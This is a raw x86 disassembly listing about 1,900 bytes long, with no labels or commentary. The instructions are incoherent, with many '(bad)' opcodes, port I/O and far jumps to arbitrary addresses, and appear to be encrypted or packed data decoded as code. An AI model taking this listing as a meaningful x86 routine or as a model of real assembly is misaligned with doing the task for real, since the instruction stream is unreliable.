  41ddad:	sub    ebx,ebp
  41ddaf:	lds    esi,FWORD PTR [ebx+0x4031b224]
  41ddb5:	outs   dx,DWORD PTR ds:[esi]
  41ddb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddb7:	inc    edi
  41ddb8:	xor    DWORD PTR [ebp-0x5c],esp
  41ddbb:	fisttp DWORD PTR [edx+0x6f]
  41ddbe:	add    esp,edi
  41ddc0:	neg    BYTE PTR [ebx-0x6de4fcbb]
  41ddc6:	adc    eax,DWORD PTR [eax+0x10]
  41ddc9:	retf   
  41ddca:	jg     0x41de30
  41ddcc:	cwde   
  41ddcd:	mov    al,BYTE PTR [ebx-0x73]
  41ddd0:	sbb    DWORD PTR [ebx-0x31dbb91d],ebx
  41ddd6:	(bad)  
  41ddd7:	iret   
  41ddd8:	adc    al,0x64
  41ddda:	mov    edx,DWORD PTR [eax-0x2c005617]
  41dde0:	mov    esi,0xfa5171ac
  41dde5:	ss jo  0x41dddd
  41dde8:	in     al,0xc6
  41ddea:	mov    edx,0xa46cdcd4
  41ddef:	(bad)  
  41ddf0:	xlat   BYTE PTR ds:[ebx]
  41ddf1:	pop    edi
  41ddf2:	dec    esp
  41ddf3:	sti    
  41ddf4:	in     eax,dx
  41ddf5:	enter  0xd19c,0xf0
  41ddf9:	xor    ch,cl
  41ddfb:	das    
  41ddfc:	fiadd  WORD PTR [eax+eiz*2+0x32]
  41de00:	jmp    0x9b04:0x197be82b
  41de07:	cmp    eax,0x2b0ec0e8
  41de0c:	mov    esp,0x1a4c104d
  41de11:	pop    edi
  41de12:	or     DWORD PTR [edi],0x693f6231
  41de18:	ret    0x6b5c
  41de1b:	leave  
  41de1c:	sub    al,0x5a
  41de1e:	fistp  DWORD PTR [ecx]
  41de20:	mov    ah,0x25
  41de22:	mov    bl,0xf5
  41de24:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41de26:	setbe  BYTE PTR [edx+ebx*4+0xda54f5f]
  41de2e:	scas   al,BYTE PTR es:[edi]
  41de2f:	ficomp WORD PTR [eax]
  41de31:	push   0x3934b5f6
  41de36:	lods   eax,DWORD PTR ds:[esi]
  41de37:	sub    BYTE PTR [eax+0x52],al
  41de3a:	adc    BYTE PTR [ecx],dl
  41de3c:	pop    ds
  41de3d:	not    DWORD PTR [esi+0x8]
  41de40:	aas    
  41de41:	(bad)  [edx]
  41de43:	ds loop 0x41de78
  41de46:	inc    eax
  41de47:	out    dx,eax
  41de48:	and    BYTE PTR [ebx+0x60],ah
  41de4b:	in     eax,dx
  41de4c:	in     eax,dx
  41de4d:	mov    edx,0xfb9b0ce0
  41de52:	or     edi,DWORD PTR [esi+0x528d87d3]
  41de58:	imul   ebp,edi,0xffffffcf
  41de5b:	test   BYTE PTR [esi+edi*1+0x2401b4e9],0x9d
  41de63:	inc    ebx
  41de64:	lods   al,BYTE PTR ds:[esi]
  41de65:	push   es
  41de66:	mov    ch,0x6f
  41de68:	(bad)  
  41de69:	jo     0x41de68
  41de6b:	jp     0x41ddfa
  41de6d:	xor    ch,dh
  41de6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de70:	or     bl,BYTE PTR [esi+ebx*4-0x7b]
  41de74:	xchg   esi,eax
  41de75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de76:	ins    DWORD PTR es:[edi],dx
  41de77:	jmp    0x41de9e
  41de79:	int3   
  41de7a:	js     0x41dee7
  41de7c:	js     0x41debf
  41de7e:	xor    ah,BYTE PTR [eax+0x0]
  41de81:	sbb    esp,DWORD PTR [eax+0x1f09aa65]
  41de87:	and    BYTE PTR [eax],0x6c
  41de8a:	add    eax,0xefad0fb1
  41de8f:	test   al,0xbd
  41de91:	or     eax,0x8c0b75
  41de96:	nop
  41de97:	mov    ebx,0x3100eff3
  41de9c:	in     al,0x8f
  41de9e:	xchg   ebp,eax
  41de9f:	outs   dx,DWORD PTR ds:[esi]
  41dea0:	add    eax,0xa06b8425
  41dea5:	dec    ebx
  41dea6:	and    eax,0x77fae0ff
  41deab:	and    eax,DWORD PTR [ebp-0x64]
  41deae:	(bad)  
  41deaf:	lods   al,BYTE PTR ds:[esi]
  41deb0:	inc    esp
  41deb1:	sbb    eax,0x5a232291
  41deb6:	mov    dh,0x59
  41deb8:	ins    DWORD PTR es:[edi],dx
  41deb9:	add    cl,dl
  41debb:	and    cl,BYTE PTR [ecx+0x2f]
  41debe:	aaa    
  41debf:	xchg   edx,eax
  41dec0:	push   ebx
  41dec1:	or     al,0x13
  41dec3:	mov    dl,0xc0
  41dec5:	div    BYTE PTR [edx+0x7b]
  41dec8:	outs   dx,BYTE PTR ds:[esi]
  41dec9:	mov    esp,0x71af94f9
  41dece:	cmp    eax,DWORD PTR [ebx+0x553b68c7]
  41ded4:	cli    
  41ded5:	(bad)  
  41ded6:	(bad)  
  41ded7:	dec    ebx
  41ded8:	add    BYTE PTR [edx-0x3c],dh
  41dedb:	jp     0x41debb
  41dedd:	mov    esi,0x269d5277
  41dee2:	cdq    
  41dee3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dee4:	pop    esp
  41dee5:	push   ebx
  41dee6:	mov    ebp,DWORD PTR [edi]
  41dee8:	mov    dh,0x84
  41deea:	or     ebp,DWORD PTR ss:[ebp+0x9]
  41deee:	out    0xdd,eax
  41def0:	push   edx
  41def1:	gs pop esp
  41def3:	mov    dh,0x90
  41def5:	imul   esp,DWORD PTR [eax-0x6b1bed83],0xd97f3d55
  41deff:	jmp    0xb52ddc49
  41df04:	scas   al,BYTE PTR es:[edi]
  41df05:	cmp    edx,0x4f
  41df08:	call   0x8c1e1205
  41df0d:	cmp    esi,DWORD PTR [eax]
  41df0f:	or     bh,BYTE PTR ds:0x51cea64c
  41df15:	mov    esi,0x21cf9369
  41df1a:	xchg   BYTE PTR [edi-0x44489378],ah
  41df20:	aad    0xe6
  41df22:	icebp  
  41df23:	push   0x75fdcd52
  41df28:	and    BYTE PTR [eax-0x31],0x9c
  41df2c:	mov    bh,0x48
  41df2e:	sbb    eax,0xb2a0f944
  41df33:	cmp    eax,0x29e748d9
  41df38:	ret    0xfb23
  41df3b:	sbb    esp,DWORD PTR [ebx+0x5363f501]
  41df41:	ins    DWORD PTR es:[edi],dx
  41df42:	sub    BYTE PTR [edx+0x4c],bl
  41df45:	adc    DWORD PTR [edx+0x48ffabc5],eax
  41df4b:	outs   dx,BYTE PTR ds:[esi]
  41df4c:	je     0x41dfb9
  41df4e:	rcr    DWORD PTR [ebp-0x659c47b9],1
  41df54:	imul   esp,DWORD PTR ds:[ecx+0x5b6702a2],0x69edc66f
  41df5f:	xor    DWORD PTR [edx+0x1f],esp
  41df62:	jno    0x41deed
  41df64:	gs cs xor bh,al
  41df68:	push   edi
  41df69:	bound  edi,QWORD PTR [edx]
  41df6b:	sahf   
  41df6c:	inc    esi
  41df6e:	pusha  
  41df6f:	jle    0x41df83
  41df71:	in     eax,0xc3
  41df73:	out    0x6,eax
  41df75:	pop    esi
  41df76:	xor    BYTE PTR [esi],ah
  41df78:	repz sbb cl,BYTE PTR [ebp-0x14e05ec4]
  41df7f:	mov    BYTE PTR [esi-0x4f905820],cl
  41df85:	fadd   st(6),st
  41df87:	xchg   DWORD PTR [eax+0x75bc1abd],edx
  41df8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41df8e:	pushf  
  41df8f:	(bad)  
  41df90:	es in  al,dx
  41df92:	ins    DWORD PTR es:[edi],dx
  41df93:	push   ds
  41df94:	xor    cl,BYTE PTR ds:0x12c27e5f
  41df9a:	push   ebp
  41df9b:	push   ds
  41df9c:	sahf   
  41df9d:	xrelease mov DWORD PTR [esi+edi*2+0x2d],0x549320ed
  41dfa6:	shl    DWORD PTR [eax+0x4a231715],1
  41dfac:	fsub   QWORD PTR [edx-0x21]
  41dfaf:	and    bh,0xaa
  41dfb2:	push   eax
  41dfb3:	pop    edx
  41dfb4:	mov    ch,0x65
  41dfb6:	(bad)  
  41dfb7:	call   0x49933413
  41dfbc:	in     al,0x9f
  41dfbe:	mov    ebx,0xbc6ccc7a
  41dfc3:	in     eax,0x58
  41dfc5:	and    DWORD PTR [edi],esi
  41dfc7:	in     eax,0x1e
  41dfc9:	pop    eax
  41dfca:	jnp    0x41dfdd
  41dfcc:	icebp  
  41dfcd:	cmp    esp,esi
  41dfcf:	mov    ds:0xc86e4580,al
  41dfd4:	mov    ah,BYTE PTR [eax+eiz*4+0x2b]
  41dfd8:	outs   dx,DWORD PTR ds:[esi]
  41dfd9:	push   ss
  41dfda:	adc    edx,DWORD PTR [eax*1-0x13754086]
  41dfe1:	mov    bl,0x5c
  41dfe3:	test   eax,0xf00cf295
  41dfe8:	or     al,BYTE PTR [edx*1+0xa9f8d77]
  41dfef:	or     ch,dl
  41dff1:	cs jb  0x41e02e
  41dff4:	je     0x41dffa
  41dff6:	cmc    
  41dff7:	scas   al,BYTE PTR es:[edi]
  41dff8:	in     al,0x3d
  41dffa:	pop    ebp
  41dffb:	std    
  41dffc:	or     BYTE PTR [eax-0x511f2755],dl
  41e002:	in     eax,dx
  41e003:	jae    0x41e00d
  41e005:	jns    0x41e00e
  41e007:	push   cs
  41e008:	xchg   edi,eax
  41e009:	ss push eax
  41e00b:	aam    0xd7
  41e00d:	lock xor ch,BYTE PTR [edx]
  41e010:	jle    0x41dfeb
  41e012:	xor    al,0x2f
  41e014:	stos   DWORD PTR es:[edi],eax
  41e015:	repnz pusha 
  41e017:	add    eax,DWORD PTR [ecx-0x51162980]
  41e01d:	ret    
  41e01e:	ret    0x75c
  41e021:	cmp    al,0xfc
  41e023:	sbb    BYTE PTR [eax+0x2abd9d75],0x73
  41e02a:	arpl   WORD PTR [edi],dx
  41e02c:	cmp    eax,eax
  41e02e:	mov    esi,0xfbd62214
  41e033:	into   
  41e034:	cld    
  41e035:	addr16 or al,0x75
  41e038:	adc    al,0x6a
  41e03a:	pushaw 
  41e03c:	mov    eax,0xf3d33d19
  41e041:	fcmovnb st,st(5)
  41e043:	xchg   edi,eax
  41e044:	repz pusha 
  41e046:	xchg   esp,eax
  41e047:	jle    0x41e02d
  41e049:	fdivr  QWORD PTR [edx-0x2a924bea]
  41e04f:	xchg   ecx,eax
  41e050:	pop    ebp
  41e051:	ror    DWORD PTR [eax],cl
  41e053:	popa   
  41e054:	pop    ss
  41e055:	mov    al,0x69
  41e057:	mov    ecx,0xfbf2f80e
  41e05c:	icebp  
  41e05d:	mov    dl,0xe5
  41e05f:	shl    BYTE PTR [ebx],1
  41e061:	test   DWORD PTR [ebp+0x6f],ebp
  41e064:	arpl   WORD PTR [edi+0x351633c4],sp
  41e06a:	cmp    al,0xfb
  41e06c:	ss js  0x41e0cc
  41e06f:	mov    bh,BYTE PTR [eax-0x6c28bf0d]
  41e075:	push   es
  41e076:	and    ah,cl
  41e078:	mov    esp,0x1d2d8f9c
  41e07d:	inc    eax
  41e07e:	mov    al,0x90
  41e080:	iret   
  41e081:	(bad)  
  41e082:	pop    edx
  41e083:	push   edx
  41e084:	pop    eax
  41e085:	dec    ecx
  41e086:	jbe    0x41e0c3
  41e088:	aas    
  41e089:	mov    ch,0x41
  41e08b:	jo     0x41e064
  41e08d:	aam    0xcb
  41e08f:	xor    ecx,ecx
  41e091:	push   0xbcfaab41
  41e096:	mov    dh,ch
  41e098:	and    BYTE PTR [ebx+0x62699c2f],dl
  41e09e:	pop    esp
  41e09f:	inc    edx
  41e0a0:	jmp    0x41e043
  41e0a2:	xchg   edx,eax
  41e0a3:	(bad)  
  41e0a5:	pop    ebp
  41e0a6:	push   ss
  41e0a7:	popf   
  41e0a8:	jns    0x41e0f4
  41e0aa:	inc    esi
  41e0ab:	dec    ebp
  41e0ac:	stc    
  41e0ad:	mov    esp,0x4987f05f
  41e0b2:	xor    BYTE PTR [ebx+edx*8+0x5903073b],cl
  41e0b9:	sub    DWORD PTR [ebp+0x1071b874],esp
  41e0bf:	xchg   BYTE PTR [esi+0x599f28eb],ch
  41e0c5:	test   dl,al
  41e0c7:	mov    edi,DWORD PTR [esi-0xc8caa06]
  41e0cd:	jp     0x41e098
  41e0cf:	adc    edi,esp
  41e0d1:	fcom   DWORD PTR [edi+0x78f66309]
  41e0d7:	mov    eax,ds:0xb0d343e7
  41e0dc:	imul   edi,DWORD PTR [edi],0xffffff97
  41e0df:	sbb    DWORD PTR [eax+0x17],ecx
  41e0e2:	fst    QWORD PTR [edx]
  41e0e4:	jne    0x41e075
  41e0e6:	fidiv  DWORD PTR [ecx-0x3b26f161]
  41e0ec:	sub    bh,BYTE PTR [ebp+0x1b]
  41e0ef:	jle    0x41e092
  41e0f1:	rcr    esi,0x35
  41e0f4:	fwait
  41e0f5:	jle    0x41e091
  41e0f7:	sub    BYTE PTR [edi-0x28],ch
  41e0fa:	adc    BYTE PTR [edi+0x65],ch
  41e0fd:	push   ecx
  41e0fe:	stos   DWORD PTR es:[edi],eax
  41e0ff:	jmp    0xee19:0x91159771
  41e106:	in     al,dx
  41e107:	pusha  
  41e108:	push   esi
  41e109:	adc    cl,BYTE PTR [edx]
  41e10b:	cmp    bl,cl
  41e10d:	fwait
  41e10e:	jno    0x41e0ca
  41e110:	pop    edx
  41e111:	push   ecx
  41e112:	dec    ebp
  41e113:	retf   
  41e114:	sbb    BYTE PTR [ebp-0x2b],ch
  41e117:	dec    eax
  41e118:	sahf   
  41e119:	xchg   ebx,eax
  41e11a:	in     al,dx
  41e11b:	hlt    
  41e11c:	inc    eax
  41e11d:	dec    ebp
  41e11e:	test   al,0xbf
  41e120:	dec    ecx
  41e121:	add    dh,BYTE PTR [ebp-0x69]
  41e124:	and    dl,BYTE PTR [esi-0x20d3e218]
  41e12a:	ds pop esi
  41e12c:	cli    
  41e12d:	mov    ah,0xbb
  41e12f:	pop    edx
  41e130:	pop    edx
  41e131:	mov    ch,0x4f
  41e133:	xchg   ecx,eax
  41e134:	movntq QWORD PTR ds:0xf32aa98e,mm2
  41e13b:	mov    esi,0xe9712a94
  41e140:	jnp    0x41e198
  41e142:	mov    bh,0x79
  41e144:	imul   edi,DWORD PTR [edx-0x6c154daf],0xffffff95
  41e14b:	or     BYTE PTR [ebp-0x6f],ch
  41e14e:	pop    esp
  41e14f:	repnz sub DWORD PTR [esi+edx*8],edi
  41e153:	jbe    0x41e101
  41e155:	pushf  
  41e156:	or     eax,0x6d52bb72
  41e15b:	and    al,0x46
  41e15d:	jns    0x41e0eb
  41e15f:	mov    DWORD PTR [edi],ecx
  41e161:	xchg   BYTE PTR [esi-0x15bba008],bl
  41e167:	imul   edx,eax,0x11e57901
  41e16d:	fs mov edi,0x8997079c
  41e173:	jecxz  0x41e13f
  41e175:	iret   
  41e176:	cmp    eax,0xd94f34ab
  41e17b:	fisttp DWORD PTR [edx+0x0]
  41e17e:	add    al,0x72
  41e180:	daa    
  41e181:	ins    BYTE PTR es:[edi],dx
  41e182:	inc    edi
  41e183:	add    al,0xdb
  41e185:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e186:	ds ss in al,0xac
  41e18a:	and    edi,DWORD PTR [edx+0x37]
  41e18d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e18e:	push   ebx
  41e18f:	cmp    BYTE PTR [edi+0x7fe70970],bl
  41e195:	je     0x41e1d4
  41e197:	adc    BYTE PTR [eax-0x73],0x3b
  41e19b:	not    DWORD PTR [eax-0x2bc4d291]
  41e1a1:	fsubr  DWORD PTR [eax]
  41e1a3:	repz les edi,FWORD PTR [edx+0xe]
  41e1a7:	sti    
  41e1a8:	or     ebx,DWORD PTR [esi]
  41e1aa:	jl     0x41e1a5
  41e1ac:	imul   esp,eax,0x76
  41e1af:	push   0xf6b65085
  41e1b4:	ret    
  41e1b5:	mov    ebp,0xb44e2852
  41e1ba:	add    edi,DWORD PTR [ebp+0x438103ab]
  41e1c0:	das    
  41e1c1:	sbb    eax,0x23454646
  41e1c6:	cld    
  41e1c7:	popa   
  41e1c8:	arpl   WORD PTR [ebx-0xe9318e0],sp
  41e1ce:	cmp    BYTE PTR [ebx+0x20fb0c5b],al
  41e1d4:	aad    0x6e
  41e1d6:	dec    ecx
  41e1d7:	push   ebp
  41e1d8:	addr16 (bad) 
  41e1da:	fneni(8087 only) 
  41e1dc:	mov    edi,0xb2ea2d11
  41e1e1:	lahf   
  41e1e2:	cmp    al,0x21
  41e1e4:	cld    
  41e1e5:	in     al,0xa7
  41e1e7:	gs mov ebp,0xdcf39a27
  41e1ed:	sub    DWORD PTR [edx+0x50],0xffffffc1
  41e1f1:	imul   ebx,ebx,0xbf6fe1e7
  41e1f7:	jp     0x41e232
  41e1f9:	dec    ebx
  41e1fa:	shl    DWORD PTR [esi+edx*8-0x66],cl
  41e1fe:	ins    BYTE PTR es:[edi],dx
  41e1ff:	(bad)  
  41e200:	pop    esi
  41e201:	jmp    0x41e1d3
  41e203:	jne    0x41e22f
  41e205:	add    al,0x35
  41e207:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e208:	std    
  41e209:	mov    al,0xf8
  41e20b:	jns    0x41e1e0
  41e20d:	fld    DWORD PTR [eax]
  41e20f:	xchg   BYTE PTR [esi+0x4524280d],ah
  41e215:	xchg   edx,eax
  41e216:	xor    edx,ebx
  41e218:	inc    ecx
  41e219:	cdq    
  41e21a:	push   0x56
  41e21c:	dec    esi
  41e21d:	imul   DWORD PTR [ecx+ecx*8]
  41e220:	and    eax,DWORD PTR [edi-0x17]
  41e223:	mov    al,0x6a
  41e225:	pop    ds
  41e226:	nop
  41e227:	add    edx,0x2f
  41e22a:	or     eax,0xc681a327
  41e22f:	jb     0x41e1e1
  41e231:	(bad)  
  41e232:	fdivrp st(3),st
  41e234:	call   0x4e1b1f4e
  41e239:	icebp  
  41e23a:	sub    DWORD PTR [eax-0x23],0xae2e13c2
  41e241:	lea    edi,[ecx+0x5b]
  41e244:	hlt    
  41e245:	iret   
  41e246:	cmp    edx,DWORD PTR [esi+edi*4-0xf711a2]
  41e24d:	hlt    
  41e24e:	or     al,0x38
  41e250:	xchg   ecx,eax
  41e251:	mov    ds:0xa126aaa3,eax
  41e256:	jne    0x41e24a
  41e258:	repz mov ah,0xc5
  41e25b:	xchg   ecx,eax
  41e25c:	inc    ecx
  41e25d:	test   DWORD PTR [eax-0x204a5955],0x7af7c44f
  41e267:	pop    esp
  41e268:	push   0x49
  41e26a:	mov    ebx,0x8209535b
  41e26f:	dec    ebx
  41e270:	(bad)  
  41e271:	jp     0x41e2ed
  41e273:	sbb    BYTE PTR [esi-0x5a],cl
  41e276:	into   
  41e277:	sbb    DWORD PTR [eax+edi*8],edx
  41e27a:	xor    eax,0x8949e8c3
  41e27f:	int3   
  41e280:	mov    WORD PTR [eax],?
  41e282:	(bad)  
  41e283:	and    eax,0x117f468
  41e288:	mov    bl,0xd0
  41e28a:	dec    edx
  41e28b:	nop
  41e28c:	dec    edi
  41e28d:	pop    esi
  41e28e:	jb     0x41e2b2
  41e290:	rcl    edi,1
  41e292:	inc    edx
  41e293:	jns    0x41e2f6
  41e295:	retf   
  41e296:	push   cs
  41e297:	push   ebp
  41e298:	dec    edx
  41e299:	jo     0x41e261
  41e29b:	arpl   sp,bx
  41e29d:	inc    ebp
  41e29e:	outs   dx,DWORD PTR ds:[si]
  41e2a0:	or     eax,0x1c2b6bc9
  41e2a5:	pop    es
  41e2a6:	jns    0x41e2c8
  41e2a8:	fmul   DWORD PTR [edx+eiz*4]
  41e2ab:	xchg   edi,eax
  41e2ac:	or     ecx,DWORD PTR [ebx-0x2]
  41e2af:	(bad)  
  41e2b0:	dec    esp
  41e2b1:	mov    al,ds:0xffcaa3c9
  41e2b6:	pop    eax
  41e2b7:	and    edi,edx
  41e2b9:	xchg   edx,eax
  41e2ba:	push   ecx
  41e2bb:	mov    ds:0xa3f7e3d8,al
  41e2c0:	add    al,0xed
  41e2c2:	dec    ebp
  41e2c3:	adc    dl,ah
  41e2c5:	fiadd  WORD PTR ds:0x93d72e32
  41e2cb:	repz jmp 0xcf852784
  41e2d1:	ins    DWORD PTR es:[edi],dx
  41e2d2:	pop    es
  41e2d3:	mov    ebp,0xd3904ee6
  41e2d8:	mov    al,0x69
  41e2da:	or     BYTE PTR [ebp-0x7b],0x54
  41e2de:	adc    al,0x4
  41e2e0:	not    BYTE PTR [eax-0xa6ad675]
  41e2e6:	stos   BYTE PTR es:[edi],al
  41e2e7:	int3   
  41e2e8:	ret    
  41e2e9:	xchg   BYTE PTR [edi+0x1fa846f5],dl
  41e2ef:	data16 or BYTE PTR [eax],ah
  41e2f2:	into   
  41e2f3:	jmp    0x443d736d
  41e2f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e2f9:	mov    ah,0x68
  41e2fb:	adc    DWORD PTR [ecx-0x32],esp
  41e2fe:	jmp    0x9a2a41c2
  41e303:	sbb    DWORD PTR [edi],ecx
  41e305:	shl    edx,0x74
  41e308:	sub    ebx,DWORD PTR [eax]
  41e30a:	retf   0x6424
  41e30d:	cs mov bh,0xb
  41e310:	(bad)  
  41e311:	mov    bl,0xd2
  41e313:	iret   
  41e314:	sbb    DWORD PTR [eax],edx
  41e316:	shl    BYTE PTR [edi+0x24c223c9],1
  41e31c:	sbb    eax,DWORD PTR [ebp-0x9e2bc04]
  41e322:	iret   
  41e323:	mov    edx,DWORD PTR ds:0xb0da1fc4
  41e329:	enter  0x2bcf,0xb6
  41e32d:	stc    
  41e32e:	cmp    dh,BYTE PTR [ecx+0x37]
  41e331:	sbb    al,0xf1
  41e333:	or     DWORD PTR [edi+0x3a],edx
  41e336:	out    dx,eax
  41e337:	push   ebx
  41e338:	dec    ebp
  41e339:	or     ecx,DWORD PTR [ecx+edi*1]
  41e33c:	cmp    al,0x58
  41e33e:	iret   
  41e33f:	push   ss
  41e340:	lods   al,BYTE PTR ds:[esi]
  41e341:	sbb    ch,BYTE PTR [ecx+0x46]
  41e344:	popf   
  41e345:	fiadd  WORD PTR [esi-0x64]
  41e348:	and    eax,0xca9ae628
  41e34d:	sbb    eax,0x746d6788
  41e352:	dec    esi
  41e353:	in     eax,0xc2
  41e355:	xchg   ebx,eax
  41e356:	xchg   edi,eax
  41e357:	std    
  41e358:	cmp    ch,BYTE PTR [ecx-0x3]
  41e35b:	cmp    edx,DWORD PTR [ebx+0x293dee0f]
  41e361:	sub    eax,0xda74ef4e
  41e366:	add    DWORD PTR [esi-0x22cad67],ebx
  41e36c:	sub    eax,0x8fc9175
  41e371:	xor    al,0xd9
  41e373:	test   DWORD PTR [esp+ecx*8],0xc138c93
  41e37a:	call   0x4786:0x2fcb4e16
  41e381:	sub    ebp,DWORD PTR [edx]
  41e383:	sbb    eax,0xe5bf4cb6
  41e388:	xor    DWORD PTR [ebp-0x49],esp
  41e38b:	cmp    dl,BYTE PTR [ecx-0x4c9427e9]
  41e391:	mov    edx,0xe7809b91
  41e396:	push   esi
  41e397:	sar    dl,cl
  41e399:	push   esi
  41e39a:	fldcw  WORD PTR [ebx-0x5a]
  41e39d:	sub    dh,BYTE PTR [edi+0x4599a6bc]
  41e3a3:	in     al,dx
  41e3a4:	xor    eax,0x2743adae
  41e3a9:	push   ecx
  41e3aa:	xor    ebp,DWORD PTR [esi-0x2f4a7a5c]
  41e3b0:	dec    edi
  41e3b1:	sbb    cl,dh
  41e3b3:	jae    0x41e422
  41e3b5:	xchg   ebx,eax
  41e3b6:	inc    ebx
  41e3b7:	pop    esp
  41e3b8:	cdq    
  41e3b9:	pop    esi
  41e3ba:	ja     0x41e384
  41e3bc:	cmc    
  41e3bd:	sahf   
  41e3be:	pop    ebx
  41e3bf:	cld    
  41e3c0:	and    eax,0x9d9c9f3d
  41e3c5:	jmp    0x4a06e8f7
  41e3ca:	lds    eax,FWORD PTR [edi]
  41e3cc:	aam    0x9e
  41e3ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e3cf:	sub    esi,DWORD PTR [esi]
  41e3d1:	pop    es
  41e3d2:	in     al,dx
  41e3d3:	sub    al,0x8f
  41e3d5:	mov    ds:0x811a2d15,al
  41e3da:	les    edi,FWORD PTR [eax+0x7b]
  41e3dd:	call   0x90b290a2
  41e3e2:	adc    ah,bh
  41e3e4:	and    DWORD PTR [esi-0x22],eax
  41e3e7:	or     ch,BYTE PTR [ebp-0x45]
  41e3ea:	hlt    
  41e3eb:	aas    
  41e3ec:	pusha  
  41e3ed:	outs   dx,DWORD PTR ds:[esi]
  41e3ee:	or     DWORD PTR ds:0x7004d207,ebx
  41e3f4:	jb     0x41e384
  41e3f6:	hlt    
  41e3f7:	aaa    
  41e3f8:	mov    al,0x9b
  41e3fa:	icebp  
  41e3fb:	pop    ss
  41e3fc:	(bad)  
  41e3fd:	int3   
  41e3fe:	lods   al,BYTE PTR ds:[esi]
  41e3ff:	test   DWORD PTR [esi+0x65acfb5e],esi
  41e405:	lds    ecx,FWORD PTR ds:0x951fe38e
  41e40b:	mov    eax,DWORD PTR [edi-0x4866112c]
  41e411:	sbb    al,0x3b
  41e413:	cwde   
  41e414:	jp     0x41e3c1
  41e416:	adc    edi,DWORD PTR [esi+0x2e]
  41e419:	push   0xba201932
  41e41e:	adc    eax,0x704b3d47
  41e423:	add    BYTE PTR [eax+esi*4],bl
  41e426:	arpl   WORD PTR [edi-0x34],sp
  41e429:	adc    al,0xb9
  41e42b:	add    ecx,ebx
  41e42d:	mov    al,ds:0xd19bd91a
  41e432:	push   es
  41e433:	push   esp
  41e434:	shl    DWORD PTR [edx],1
  41e436:	je     0x41e4b1
  41e438:	out    dx,eax
  41e439:	sbb    DWORD PTR [esi],esi
  41e43b:	test   eax,0xac525f4b
  41e440:	cld    
  41e441:	(bad)  
  41e443:	daa    
  41e444:	(bad)  
  41e445:	xchg   ebp,eax
  41e446:	ror    DWORD PTR [ebx],1
  41e448:	push   0x8bfebf2c
  41e44d:	push   esi
  41e44e:	xchg   ebp,eax
  41e44f:	inc    ebx
  41e450:	fbstp  TBYTE PTR [eax+0x258b8c50]
  41e456:	cmp    ebp,DWORD PTR [esi]
  41e458:	mov    ds:0x1aa1af51,eax
  41e45d:	out    dx,eax
  41e45e:	int    0x21
  41e460:	test   al,0xb1
  41e462:	sbb    DWORD PTR [esi+0xd],0xb90fe94
  41e469:	scas   al,BYTE PTR es:[edi]
  41e46a:	in     eax,0xf4
  41e46c:	lahf   
  41e46d:	addr16 es in eax,dx
  41e470:	jmp    0x20c3:0x40d393c6
  41e477:	ins    BYTE PTR es:[edi],dx
  41e478:	sbb    cl,BYTE PTR [ebp+0x25]
  41e47b:	sub    al,0x2d
  41e47d:	imul   edi,ecx,0xf20ee7a9
  41e483:	ror    ch,1
  41e485:	jl     0x41e444
  41e487:	pusha  
  41e488:	lock ss mov ch,0x1f
  41e48c:	leave  
  41e48d:	mov    esi,0x2557cebe
  41e492:	jl     0x41e4b4
  41e494:	fcomp  QWORD PTR [eax-0xd96b37]
  41e49a:	jno    0x41e493
  41e49c:	cmp    al,0x35
  41e49e:	(bad)  
  41e4a0:	or     DWORD PTR [ecx-0x542f00dc],esi
  41e4a6:	xor    esp,edx
  41e4a8:	cmp    BYTE PTR [edx+edi*2+0x20],dh
  41e4ac:	cs stos DWORD PTR es:[edi],eax
  41e4ae:	sub    DWORD PTR [edx-0x6a],0xffffff84
  41e4b2:	idiv   DWORD PTR [esi+esi*8+0x1c]
  41e4b6:	push   ss
  41e4b7:	mov    esp,0xb3d816c3
  41e4bc:	cmp    al,0x18
  41e4be:	jbe    0x41e496
  41e4c0:	mov    ah,0x7f
  41e4c2:	test   ah,cl
  41e4c4:	push   edi
  41e4c5:	jl     0x41e45d
  41e4c7:	xchg   edi,eax
  41e4c8:	push   0x7778f74b
  41e4cd:	mov    ebx,0x4e464a0c
  41e4d2:	mov    ecx,0x151b5a51
  41e4d7:	jno    0x41e4dd
  41e4d9:	pop    eax
  41e4da:	das    
  41e4db:	daa    
  41e4dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e4dd:	jnp    0x41e46b
  41e4df:	rcl    DWORD PTR [ebx+eiz*4+0x65894bb9],1
  41e4e6:	xor    edx,ebx
  41e4e8:	not    DWORD PTR [ebx-0x2929442a]
  41e4ee:	mov    esp,esi
  41e4f0:	push   ebp
  41e4f1:	mov    ebx,0x913e58da
  41e4f6:	pop    ds
  41e4f7:	sbb    eax,0x8b56f4ff
  41e4fc:	push   ebp
  41e4fd:	lea    edi,[edi+edx*8+0x6e9a73e8]
  41e504:	pop    ss
  41e505:	inc    eax
  41e506:	xchg   BYTE PTR [edx+ecx*1],ah
  41e509:	test   DWORD PTR [ecx-0x25b8de23],edx
  41e50f:	mov    ebx,DWORD PTR [eax-0x7df5b94d]
  41e515:	stc    
  41e516:	mov    esi,0xe2bcab7
  41e51b:	loopne 0x41e4e8
  41e51d:	jae    0x41e544
  41e51f:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41e521:	sbb    BYTE PTR [esi-0x576e2be1],bh
  41e527:	push   eax
  41e528:	hlt    
  41e529:	xchg   esi,eax
  41e52a:	mov    al,0x0
  41e52c:	mov    eax,ds:0x75cebcdb
  41e531:	jae    0x41e577
  41e533:	xchg   ebp,eax
  41e534:	nop
  41e535:	cmovo  edi,DWORD PTR [ebx-0x65edbdb3]
  41e53c:	push   ebp
  41e53d:	and    al,cl
  41e53f:	mov    al,0xf8
  41e541:	out    0x3e,al
  41e543:	mov    ecx,0x1d131b58
  41e548:	gs dec ebx
  41e54a:	or     DWORD PTR [edx+eax*8],ebp
  41e54d:	outs   dx,BYTE PTR ds:[esi]
  41e54e:	fst    QWORD PTR [ebx+eiz*1-0xa]
